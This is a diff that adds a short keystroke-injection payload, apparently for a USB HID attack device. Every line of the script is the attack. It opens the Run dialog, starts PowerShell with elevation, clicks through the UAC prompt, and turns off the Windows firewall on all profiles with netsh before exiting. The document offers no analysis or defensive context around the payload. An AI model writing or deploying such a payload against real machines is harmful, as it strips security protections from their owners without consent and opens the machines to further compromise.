@@ -1,0 +1,13 @@
+DELAY 2000
+GUI  r
+DELAY 300
+STRING powershell 
+CTRL SHIFT ENTER
+DELAY 2000
+ALT y
+DELAY 1000
+STRING netsh advfirewall set allprofiles state off 
+ENTER 
+DELAY 800
+STRING exit
+ENTER
